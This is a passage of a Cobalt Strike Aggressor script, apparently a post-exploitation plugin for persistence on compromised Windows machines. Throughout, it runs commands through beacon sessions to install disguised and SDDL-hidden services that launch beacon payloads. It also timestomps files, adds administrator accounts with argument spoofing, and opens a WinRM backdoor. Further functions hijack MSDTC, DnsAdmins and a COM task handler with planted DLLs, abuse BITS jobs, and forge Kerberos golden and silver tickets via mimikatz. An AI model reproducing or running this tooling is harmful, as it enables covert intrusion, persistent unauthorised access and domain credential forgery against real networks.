				$Reg = $Key.$Prefix.$Item;
				if($KeyName eq ""){
					blog($bid,"\c4 KeyName Not Input.");
				}else{
					if($arch eq "x86"){
						blog($bid,"reg delete  $+ $Reg /reg:32 /v $KeyName /f");
						bshell($bid,"reg delete  $+ $Reg /reg:32 /v $KeyName /f");
					}
					else if($arch eq "x64"){
						blog($bid,"reg query  $+ $Reg /reg:64 /v $KeyName /f");
						bshell($bid,"reg delete  $+ $Reg /reg:64 /v $KeyName /f");
					}
					else{
						blog($bid,"reg delete  $+ $Reg /reg:32 /v $KeyName /f");
						blog($bid,"reg delete  $+ $Reg /reg:64 /v $KeyName /f");
						bshell($bid,"reg delete  $+ $Reg /reg:32 /v $KeyName /f");
						bshell($bid,"reg delete  $+ $Reg /reg:64 /v $KeyName /f");
					}
				}
			}
		}
		# Service
		#Add Service  @("Self-start", "Delayed-start", "Manual-start", "Trigger-start", "Start failure callback"));
		sub InstallAutoService{
			# If the service is not standard Service Procedure，binpathUse cmd /c start xx or rundll32.exe xx.dll Execution sc config Wdfup depend= AppVClient, dependParameters to pull up the manually started service, which can modify other System Services to point to the malicious service ( depend specifies the Name of the service or group that must be started before this service. The Name name is separated by a forward slash (/)
			local('$Name $File $Displayname $Description $bid $Type $addtype $setsddl $sddl $sddla $serviceFile $evilFile');
			$Type = $3['stype'];
			$Name = $3['servicename'];
			$Displayname = $3['displayname'];
			$File = $3['binpath'];
			$Description = $3['description'];
			$bid =  $3['bid'];
			$addtype =  $3['addtype'];
			$setsddl = $3['setsddl'];
			$serviceFile = $3['serviceFile'];
			$evilFile = $3['evilFile'];
			$cmdline = $3['cmdline'];
			blog($bid, "-------".getnow()."-------");
			
			blog($bid,"cmdline:$cmdline");
			#SDDLSettings 
			if($setsddl eq "Hide Services" ){
				$sddla = "hidden";
				$sddl = "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
			}else if($setsddl eq "Read Only Service"){
				$sddla = "read";
				$sddl = "D:(D;;DCWPDTSD;;;IU)(D;;DCWPDTSD;;;SU)(D;;DCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
			}else{
				$sddla = "show";
				$sddl = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
			}
			if($Name eq "" || $File eq "" ){
				berror($bid,"Check your input,Need FilePath And ServiceName.");
				return;
			}
			
			blog($bid,"Upload ".script_resource($evilFile)." to ".$File);
			bupload_raw($bid, $File, readb(openf($evilFile), -1));
			btimestomp($bid, $File, "C:\\windows\\regedit.exe");
			if($addtype eq "sc cmdline"){
				if($Type eq "Self-Start"){
					blog($bid,"sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
					blog($bid,"net start \" $+ $Displayname\"")
					bshell($bid, "sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore");
					bshell($bid,"sc description \" $+ $Name\" \" $+ $Description\"");
					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
					bshell($bid, "net start \" $+ $Displayname\"");	
				}
				else if($Type eq "Trigger Machine start"){
					blog($bid,"sc create \" $+ $Name\" binpath= \" $+ $$cmdline\" start= demand obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
					blog(($bid,"sc triggerinfo \" $+ $Name\" start/networkon"))
					blog($bid,"net start \" $+ $Displayname\"")
					bshell($bid, "sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= demand obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore");
					bshell($bid,"sc description \" $+ $Name\" \" $+ $Description\"");
					bshell($bid,"sc triggerinfo \" $+ $Name\" start/networkon");
					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
					bshell($bid, "net start \" $+ $Displayname\"");
				}
				else if($Type eq "Start-up failure callback"){
					#Failure to retrace Method sc create Wdfup binpath= "C:\Windows\System32\uinit.exe"
					#sc failure Wdfup reset=5000 actions=run/500 command="C:\Users\Administrator\Desktop\Powershell\beacon.exe"
					
					# 1. Upload Service Procedure to system32,
					blog($bid,"Upload ".script_resource("scripts/AuthMaintainExitservice/uinit.exe")." to ".$serviceFile);
					bupload_raw($bid, $serviceFile, readb(openf(script_resource("scripts/AuthMaintainExitservice/uinit.exe")), -1));
					btimestomp($bid, $serviceFile, "C:\\windows\\regedit.exe");
					
					# 2.  Create Service
					blog($bid,"sc create \" $+ $Name\" binpath= \"C:\\windows\\system32\\uinit.exe\" start= auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
					blog($bid,"sc failure \" $+ $Name\" reset=5000 actions=run/500 command=\" $+ $cmdline\"")
					blog($bid,"net start \" $+ $Displayname\"")
					
					bshell($bid,"sc create \" $+ $Name\" binpath= \"C:\\windows\\system32\\uinit.exe\" start= auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore");
					bshell($bid,"sc description \" $+ $Name\" \" $+ $Description\"");
					bshell($bid,"sc failure \" $+ $Name\" reset=5000 actions=run/500 command=\" $+ $cmdline\"");
					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
					bshell($bid, "net start \" $+ $Displayname\"");
				}
				else if ($Type eq "Delayed start"){
					blog($bid,"sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= delayed-auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
					blog($bid,"net start \" $+ $Displayname\"")
					bshell($bid, "sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= delayed-auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore");
					bshell($bid,"sc description \" $+ $Name\" \" $+ $Description\"");
					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
					bshell($bid, "net start \" $+ $Displayname\"");	
				}
				else if ($Type eq "Manual start"){
					blog($bid,"sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= demand obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
					blog($bid,"net start \" $+ $Displayname\"")
					bshell($bid, "sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= demand  obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore");
					bshell($bid,"sc description \" $+ $Name\" \" $+ $Description\"");
					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
					bshell($bid, "net start \" $+ $Displayname\"");	
				}
				
			}else if ($addtype eq "API"){
				if($serviceFile eq ""){
					berror($bid,"ServiceFile not found.");
					return;
				}
				if($Type eq "Self-Start"){
					$Type  = "SERVICE_AUTO_START";
				}else if($Type eq "Trigger Machine start"){
					$Type  = "SERVICE_HD_START";
				}else if($Type eq "Start-up failure callback" ){
					if($serviceFile eq ""){
						berror($bid,"Not found ServiceFile,Please chonfirm your input.");
						return;
					}
					$Type  = "SERVICE_Callback_START";
					
				}else if($Type eq "Manual start" ){
					$Type  = "SERVICE_DEMAND_START";
				}else if ($Type eq "Delayed start"){
					$Type  = "SERVICE_CONFIG_DELAYED_AUTO_START_INFO";
				}

				if($serviceFile eq ""){
					blog($bid,"Not found ServiceFile,Will Run $File");
					$Data = replace(URLencode($Name),'\+','%20')."|".replace(URLencode($Displayname),'\+','%20')."|".$File."|".$File."|".replace(URLencode($Description),'\+','%20')."|".$Type."|".$sddla."|"."start";
				}else{
					if($Type eq "SERVICE_Callback_START" ){
						if(binfo($bid, "arch") eq "x86"){
							blog($bid,"Beacon Arch is x86,The file will be upload in C:\\windows\\SysWOW64\\");
						}
						blog($bid,"Upload ".script_resource("scripts/AuthMaintainExitservice/uinit.exe")." to $serviceFile");			
						$handle = openf(script_resource("scripts/AuthMaintainExitservice/uinit.exe"));
						$bdata   = readb($handle, -1);
						closef($handle);#Close the handle, the file will be locked if you don't close it
						bupload_raw($bid, $serviceFile, $bdata );
					}else{
						blog($bid,"Upload ".script_resource("scripts/AuthMaintainServices/TransitEXE.exe")." to $serviceFile");	
						$handle = openf(script_resource("scripts/AuthMaintainServices/TransitEXE.exe"));
						$bdata   = readb($handle, -1);
						closef($handle);#Close the handle, the file will be locked if you don't close it
						bupload_raw($bid, $serviceFile,$bdata);
					}
					$Data = replace(URLencode($Name),'\+','%20')."|".replace(URLencode($Displayname),'\+','%20')."|".$serviceFile."|".$File."|".$cmdline."|".replace(URLencode($Description),'\+','%20') ."|".$Type."|".$sddla."|"."start";
				}
				btask($bid,$Data);
				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Services/reflective_dll.dll"),$Data, "Use API add Service", 5000);	
			}
		}
		#Modify Service,Use the config , description options
		sub ChangeAutoService{
			local('$Name $File $Displayname $Description $bid');
			$Name = $3['servicename'];
			$Displayname = $3['displayname'];
			$File = $3['binpath'];
			$Description = $3['description'];
			$bid =  $3['bid'];
			blog($bid, "-------".getnow()."-------");
			blog($bid,"sc config \" $+ $Name\" binpath= \" $+ $File\" start= auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
			blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
			blog($bid,"net start \" $+ $Name\"")
			bshell($bid, "sc config \" $+ $Name\" binpath= \" $+ $File\" start= auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore");
			bshell($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
			bshell($bid, "net start \" $+ $Name\"");		
		}
		#Hide Service,sc sdsetSettings ServiceSecurity Descriptor Definition Language(SDDL)
		sub HiddenService{
			local('$Name $SDL $bid');
			$Name = $3['servicename'];
			$SDL = $3['SDDL'];
			$bid =  $3['bid'];
			blog($bid, "-------".getnow()."-------");
			if($SDL eq "Hide"){
				blog($bid,"sc sdset \" $+ $Name\" \"D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"")
				bshell($bid,"sc sdset \" $+ $Name\" \"D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"")	
			}else{
				blog($bid,"sc sdset \" $+ $Name\" \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"")
				bshell($bid,"sc sdset \" $+ $Name\" \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"")
			}
		}

		sub DeleteService{
			local('$Name $bid');
			$Name = $3['servicename'];
			$bid =  $3['bid'];
			blog($bid, "-------".getnow()."-------");
			blog($bid,"sc delete \" $+ $Name\"");
			bshell($bid,"sc delete \" $+ $Name\"");
		}

		#Query Service
		sub QService{
			local('$Name $Typ $Stat $Qtyp $bid');
			$Name = $3['servicename'];
			$Typ  = $3['type'];
			$Stat  = $3['state'];
			$Qtyp  = $3['qtype'];
			$bid =  $3['bid'];
			blog($bid, "-------".getnow()."-------");
			if($Name eq ""){
				$Qtyp ="query";
				if($Stat eq "active"){
					blog($bid,"sc  $+ $Qtyp type=  $+ $Typ");
					bshell($bid,"sc  $+ $Qtyp type=  $+ $Typ");
				}else{
					blog($bid,"sc  $+ $Qtyp type=  $+ $Typ  state=  $+ $Stat");
					bshell($bid,"sc  $+ $Qtyp type=  $+ $Typ  state=  $+ $Stat");
				}
			}
			else{
				#show_message(strlen($Name));
				blog($bid,"sc  $+ $Qtyp \" $+ $Name\"");
				bshell($bid,"sc  $+ $Qtyp \" $+ $Name\"");
			}
		}

		sub ChangeAccount{
			local('$User $Pwd $groups $bid $Type $Do $Parameter $comment $tmp');
			$bid = $3['bid'];
			$User = $3['user'];
			$Pwd = $3['pass'];
			$groups = $3['localgroups'];
			$tmp = replace($3['comment'],' ','');
			$tmp = replace($tmp,'|','');
			
			$Type = $3['addtype'];   #API NET 
			$Do = $3['DoFt'];        #Disable, Enable, Delete group User 
			#Enable
			if($Do eq "enable"){
				#net Command Enable
				if($Type eq "NET"){
					blog($bid, "Enable user $User : $User/$Pwd");
					bshell($bid, "net user $User /active:yes");
					bshell($bid, "net localgroup $groups $User /add");
					bshell($bid, "net user $User $Pwd");
				}else if($Type eq "API"){
					# API Enable
					# Guest,1,administrators,password  Enable Guest,Join Management Group,Settings Password
					blog($bid, "Use API to Enable account $User");
					if($comment eq ""){
						$Parameter = "ChangeAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|0000";
					}else{
						$comment = URLencode($tmp); #Account Description 
						$Parameter = "ChangeAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".$comment;
					}

					blog($bid, "$Parameter");
					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "enable account", 5000);	
				}else{
					blog($bid, "0");
				}
			}else if($Do eq "disabled"){  #Disable
				if($Type eq "NET"){
					blog($bid, "Disabled user $User");
					blog($bid, "net localgroup $groups $User /del");
					blog($bid, "net user $User /active:no");
					bshell($bid, "net localgroup $groups $User /del");
					bshell($bid, "net user $User /active:no");
				}else if($Type eq "API"){
					blog($bid, "Use API to disable account $User");
					# Guest,0,administrators,password  Disable Guest, Remove Group, Settings Password (will not Execute)
					
					$Parameter = "DisableUser"."|".$User."|1|".$groups."|1";
					blog($bid, "$Parameter");
					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "disable account", 5000);	
				}else{
					
				}
			}else{  
				#Remove a User from a group 
				if($Type eq "NET"){
					blog($bid, "net localgroup $groups $User /del");
					bshell($bid, "net localgroup $groups $User /del");
				}else if($Type eq "API"){
					blog($bid, "Use API to Remove user $User in Groups $groups");
					# Guest,3,administrators,password  Remove the User group (because if the guest is in the admin group, the next activation will fail), Settings password (will not Execution)
				
					$Parameter = "DelUserFromGroup"."|".$User."|".$Pwd."|".$groups."|1";
					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "DelUserFromGroup", 5000);	
				}else{
					
				}
			}
		}

		sub AddUser{
			local('$User $Pwd $groups $bid $Type $Parameter $comment $tmp $length1 $length2 $cmd1 $cmd2');
			$bid = $3['bid'];
			$User = $3['user'];
			$Pwd = $3['pass'];
			$groups = $3['localgroups'];
			$Type = $3['addtype'];
			$comment = replace($3['comment'],' ','');
			if($Type eq "NET"){
				blog($bid, "net1 user $User $Pwd /add");
				blog($bid, "net1 localgroup $groups $User /add");
				bshell($bid, "net1 user $User $Pwd /add");
				bshell($bid, "net1 localgroup $groups $User /add");
			}
			else if($Type eq "API"){
				if($comment eq ""){
					$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|0000";
				}else{
					$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".URLencode($comment);
				}
				blog($bid,"$Parameter");
				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "AdUser", 5000);	
				
				
				
			}else if ($Type eq "SpoofArg"){
				$cmd1 = "net1 user $User $Pwd /add";
				$cmd2 = "net1 localgroup $groups $User /add";
				blog($bid, "$cmd1");
				blog($bid, "$cmd2");
				$length1 = strlen($cmd1);
				$length2 = strlen($cmd2);
				if($length1  > $length2) {
					bargue_add($bid, "net1", randomFileName($length1));
				}
				else{
					bargue_add($bid, "net1", randomFileName($length2));
				}
				brun($bid, $cmd1);
				brun($bid, $cmd2);
				bargue_remove($bid, "net1");
			}
		}

		sub DeleteUser{
			local('$User $Type $bid');
			$bid = $3['bid'];
			$User = $3['user'];
			$Type = $3['type'];
			if($Type eq "NET"){
				blog($bid, "net user $User /del");
				bshell($bid, "net user $User /del");
			}else if($Type eq "API"){
				$Parameter = "DelUser"."|".$User."|1|1|1";
				blog($bid,"$Parameter");
				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "DelUser", 5000);					
			}	
		}

		sub URLencode{
			import java.net.URLEncoder;
			local('$string');
			$string = $1;
			try{
				$aa = [URLEncoder encode: $string ,"gb2312"];
				return $aa;
			}catch $message{
				warn("Failed:$message");
				printAll(getStackTrace());
			}
		}

		sub URLDecoder{
			import java.net.URLDecoder;
			local('$string');
			$string = $1;
			try{
				$aa = [URLDecoder decode: $string ,"gb2312"];
				return $aa;
			}catch $message{
				warn("Failed:$message");
				printAll(getStackTrace());
			}
		}

		sub randomFileName{
			local('$int');
			$int = $1;
			$str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			$random = [new Random];
			$filenameRand = [new StringBuffer];
			for ($x = 0; $x < $int; $x++)
				{
					$number = [$random nextInt:int(strlen($str))]; #Random Number
					# println($number);
					$char = charAt($str, $number);
					[$filenameRand append: $char ];
				}
			return $filenameRand;
		}

		sub bitsadmin {
			local('$bid $JobName $CmdLine');
			$bid =  $3['bid'];
			$JobName =  $3['JobName'];
			$CmdLine =  $3['CmdLine'];
			blog($bid, "Bitsadmin Jobs Name: \"$JobName\"");
			brun($bid, "bitsadmin /rawreturn /create $JobName");
			brun($bid, "bitsadmin /rawreturn /addfile $JobName C:\\Windows\\System32\\user32.dll C:\\Users\\Public\\Documents\\user32.gif");
			brun($bid, "bitsadmin /rawreturn /setnotifycmdline $JobName $CmdLine");
			brun($bid, "bitsadmin /rawreturn /setpriority $JobName high"); # Settings Specify the priority of the job. FOREGROUND HIGH NORMAL LOW
			brun($bid, "bitsadmin /rawreturn /resume $JobName");
		}


		sub msdtcdll{
			local('$bid $type $UploadPath $ociFile $Arch');
			$bid = $3['bid'];
			$type = $3['Type'];
			$ociFile = $3['ociFile'];
			$UploadPath = $3['UploadPath'];
			$Arch = $3['Arch'];
			if($type eq "Upload local file" ){
				if($ociFile eq ""){
					$Dialog = dialog("Upload oci.dll", %(UploadPath => $UploadPath , bid => $bid, Arch => $Arch ,Type => "Upload local file",ociFile => $ociFile), &msdtcdll);
					dialog_description($Dialog, "Please select oci.dllUpload ");
					drow_file($Dialog, "ociFile", "File: ");
					dbutton_action($Dialog, "Upload ");
					dialog_show($Dialog);
				}
				else{
					#File Upload 
					blog($bid,"Upload ".$ociFile." to C:\\windows\\system32\\oci.dll");	
					$handle = openf($ociFile);
					$bdata   = readb($handle, -1);
					closef($handle);
					bupload_raw($bid,"C:\\windows\\system32\\oci.dll",$bdata);
					btimestomp($bid, "C:\\windows\\system32\\oci.dll", "C:\\windows\\regedit.exe");
				
					if( $Arch eq "x64"){
						bshell($bid,"sc stop msdtc");
						bshell($bid,"sc config msdtc start= auto obj= LocalSystem");
						bshell($bid,"sc stop msdtc");
						bshell($bid,"sc start msdtc");
					}else{
						blog($bid,"sc stop msdtc");
						blog($bid,"sc config msdtc start= auto obj= LocalSystem");
						brun($bid,"sc stop msdtc");
						brun($bid,"sc config msdtc start= auto obj= LocalSystem");
						$Data = pack("I-", 1) . "MSDTC"; # When it is 1, it is start, when it is 0, it is uninstall
						bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/MoveFileEx.dll"),$Data, "Move Wow64 File To system32", 5000);
						blog($bid,"sc start msdtc");
						brun($bid,"sc start msdtc");	
					}
				}
			}
			else{
				#drow_beacon($Dialog, "bid", "Session: ");
				#drow_checkbox($dialog, "box", "Scary: ", "Check me... if you dare");
				#drow_listener_stage($Dialog, "listener", "Stage: ");
			}
		}	
	}

	separator();
    item "CS Service Horse" {
		blog($1, "\c9=========== CS Service Horse ==========");
        $bid = $1;
        servicebeacon($bid);
    }

    item "Winrm Backdoor" {
		blog($1, "\c9=========== Winrm Backdoor ==========");
        $bid = $1;
        winrm_config($bid);
    }

    item "Msdtc DLL Hijack" {
		blog($1, "\c9=========== Msdtc DLL Hijack ==========");
        $bid = $1;
        msdtc($bid);

    }
    
    item "Dnsadmin Backdoor" {
		blog($1, "\c9=========== Dnsadmin Backdoor ==========");
        $bid = $1;
        dnsadmin_config($bid);
    }


    item "WmiPrvSE Hijack" {
		blog($1, "\c9=========== WmiPrvSE Hijack ==========");
        show_message("WmiPrvSEThe opportunity to withdraw power is only once, failure is gone. General system Run only one WmiPrvSE.exe process, when there is more than one WmiPrvSE.exe process exists. Can not raise the right");
        WmiPrvSE_config($bid);
    }
    
    item "CacheTask COM Hijack" {
		blog($1, "\c9=========== CacheTask Task Plan COM interface Hijack ==========");
        CacheTask($bid);
    }
    
	  item "Silver Ticket" {
		blog($1, "\c9=========== Silver Ticket ==========");
    $bid = $1['@'];
		$dialog = dialog("Silver Ticket", %(user => "administrator", domain => "xxxx.com", sid => "sid", target => "dc.xxxx.com", rc4 => "NTLM", service => "cifs", bid => $bid), &SilverTicket);
    dialog_description($dialog, "To generate the Silver Ticket, the attacker must obtain the password ntml-hash value of the target service account.");
    drow_text($dialog, "domain", "Domain Name: ");
    drow_text($dialog, "sid", "sid: ");
    drow_text($dialog, "target", "Target Host Name: ");
    drow_text($dialog, "rc4", "NTLM-hash: ");
    drow_text($dialog, "service", "Fake service: ");
    drow_text($dialog, "user", "Fake User Name: ");
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
  }
  sub SilverTicket {
    $user = $3['user'];
    $domain = $3['domain'];
    $sid = $3['sid'];
    $target = $3['target'];
    $rc4 = $3['rc4'];
    $service = $3['service'];
    bmimikatz($bid, "kerberos::golden /domain:$domain /sid:$sid /target:$target /rc4:$rc4 /service:$service /user:$user /ptt exit");
  }

  item "Golden ticket" {
		blog($1, "\c9=========== Golden ticket ==========");
    $bid = $1['@'];
		$dialog = dialog("Golden ticket", %(admin => "administrator", domain => "xxxx.com", sid => "sid", krbtgt => "NTLM", bid => $bid), &GoldenTicket);
    dialog_description($dialog, "To generate a Golden ticket, the attacker must obtain the ntml-hash value of the krbtgt account.");
    drow_text($dialog, "admin", "Fake User Name: ");
    drow_text($dialog, "domain", "Domain Name: ");
    drow_text($dialog, "sid", "sid: ");
    drow_text($dialog, "krbtgt", "krbtgt NTLM-hash: ");
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
  }
  sub GoldenTicket {
    $admin = $3['admin'];
    $domain = $3['domain'];
    $sid = $3['sid'];
    $krbtgt = $3['krbtgt'];
    bmimikatz($bid, "kerberos::golden /admin:$admin /domain:$domain /sid:$sid /krbtgt:$krbtgt /ptt exit");
  }

}



sub servicerun{
	$exename = $3["exename"];
	$data = artifact_payload("$3['listener']", "svcexe", "$3['arch']");
	$handle = openf(">$exename");
	writeb($handle, $data);
	closef($handle);
	btask($3["bid"], "Generate service horse, Listener:$3['listener'] bits:$3['arch'] saveName name:$exename");
	bupload($3["bid"], script_resource($exename));
	bmv($3['bid'], $exename, $3["uploadoutpath"].$exename);
	btask($3["bid"], "Upload to $3['uploadoutpath']");
	$command = "sc create WindowsUpdate binPath= ".$3['uploadoutpath'].$exename." start= auto obj= LocalSystem DisplayName= windowsupdate";
	btask($3["bid"], "run $command");
	bshell($3["bid"],  $command);
	btask($3["bid"], "Query WindowsUpdate Service");
	bshell($3["bid"], "sc qc WindowsUpdate");
	btask($3["bid"], "Run WindowsUpdate Service");
	bshell($3["bid"], "sc start WindowsUpdate");
}

sub winrm_set{
	if ($3['bid']) {
		btask($bid ,"setting winrm");
		bshell($bid, "winrm quickconfig -q");
		bshell($bid, 'winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}');
		bshell($bid, "winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=\"$3['port']\"}");
		bshell($bid, "winrm set winrm/config/Client @{TrustedHosts=\"*\"}");
		btask($bid, "winrm config");
		bshell($bid, "winrm e winrm/config/listener");
	#	btask($bid,"Client connection using：winrm quickconfig -q\nwinrm set winrm/config/Client @{TrustedHosts="*"}\nwinrs -r:<ip>:<port> -u:<user> -p:<password> <command>\nExample:winrs -r:http://127.0.0.1:80 -u:administrator -p:123456 whoami");
	}else{
		berror($3['bid'], "Not an administrator");
	}
}

sub winrm_config{
	$dialog = dialog("Winrm config", %(port => "80", bid => $bid), &winrm_set);
	dialog_description($dialog, "winrmBackdoor Port Settings \nwindows server 2008 or the following ports default to port 80 (port multiplexing), can not be modified");
	drow_text($dialog, "port", "port:");
	dbutton_action($dialog, "run");
	dialog_show($dialog);
}


sub usbhistory{
	bpowerpick($bid, "Get-ItemProperty -Path HKLM:\\SYStem\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select FriendlyName");
}

sub checkdomain{
	bpowerpick($bid, "\$domain=(((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq \$False ) -or ( -not  \$Env:USERDNSDOMAIN);write-Host \"Is there a domain(True/False):\"\$domain");
}

sub deviceget{
	bshell($bid, "wmic logicaldisk get deviceid,FileSystem");
}

sub getinstall{
	bshell($bid, "wmic product get name");
}


sub getosinfo{
	bshell($bid, "wmic os get name,Version,OSArchitecture");
}


sub nicconfiginfo{
	bshell($bid, "wmic NICCONFIG get Description,IPAddress,IPSubnet,MACAddress,DHCPServer");
}


sub computergetinfo{
	bshell($bid, "wmic COMPUTERSYSTEM get UserName,Workgroup,SystemFamily");
	bshell($bid, "wmic cpu get Name,AddressWidth");
	bshell($bid, "wmic MEMORYCHIP get PartNumber,Capacity,Speed");
}

sub usergetinfo{
	bshell($bid, "wmic USERACCOUNT get Name,Domain,SID,Disabled,PasswordChangeable,PasswordRequired");
}

sub groupgetinfo{
	bshell($bid, "wmic group get Description,Name,SID");
}

sub msdtc_config{
	$dll = $3['file'];
	$name = split("\\\\", $dll);
	$dllname = $name[-1];
	$dllname_w = $3['file2']."\\\\oci.dll";
	foreach $id ($bid){
		if(-isadmin $id){
			btask($id, "Configuration msdtc dllHijack");
			bshell($id, "sc stop msdtc");
			bshell($id, "del C:\\Windows\\System32\\oci.dll /F");
			bupload($id, $dll);
			bmv($id, $dllname, $dllname_w);
			bshell($id, "sc config msdtc obj= LocalSystem");
			bshell($id, "sc start msdtc");
		}else{
			btask($id, "No Administrator privileges");
		}
	}
}

sub msdtc{
	$dialog = dialog("msdtc DLL hijack config", %(file => "",file2 => "C:\\Windows\\System32"), &msdtc_config);
	dialog_description($dialog, "msdtc DLLHijack");
	drow_file($dialog, "file", "DLL Path:");
	drow_text($dialog, "file2", "RHOST Path:");
	dbutton_action($dialog, "RUN");
	dialog_show($dialog);
}

sub dnsadminrun{
	println($3);
	$dll = split("\\\\", $3['dllpath'])[-1];
	$dllname = $3['uploadpath']."raj.dll";
	println($3['uploadpath']."raj.dll");
	bupload!($3['bid'], $3['dllpath']);
	bmv!($3['bid'], $dll, $dllname);
	bshell!($3['bid'], "dnscmd /config /serverlevelplugindll ".$dllname);
	bshell!($3['bid'], "sc stop dns");
	bshell!($3['bid'], "sc start dns");
}

sub dnsadmin_config{
	foreach $id ($bid){
		$dialog = dialog("DnsAdminConfig", %(uploadpath => "C:\\Windows\\System32\\", bid => $id), &dnsadminrun);
		dialog_description($dialog, "DnsAdmins Persistence");
		drow_text($dialog, "uploadpath", "uploadpath:");
		drow_file($dialog, "dllpath", "dllpath:" );
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
}

sub CacheTaskExec{
	btask($3['bid'], "CacheTask Task Plan COM interface DLLHijack");
	$dllname = split("\\\\", $3['dllpath'])[-1];
	bupload!($3['bid'], $3['dllpath']);
	bmv!($3['bid'], $dllname, $3['uploadpath']);
	bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /ve /t REG_SZ /d $3['uploadpath']");
